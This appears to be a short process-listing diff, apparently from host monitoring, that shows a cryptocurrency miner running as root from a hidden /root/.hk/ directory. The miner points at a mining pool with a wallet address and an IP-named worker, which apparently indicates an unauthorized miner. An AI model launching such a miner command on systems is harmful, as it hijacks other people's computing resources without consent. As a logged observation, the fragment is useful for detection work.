+ 37402  25182 root     timeout 300 /root/.hk/peakminer --url stratum+tcp://prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30
+ 37403  37402 root     /root/.hk/peakminer --url stratum+tcp://prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30
+ 37491  37403 root     /root/.hk/peakminer --url stratum+tcp://prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30
+###P2END Tue Nov 24 18:17:52 UTC 2026
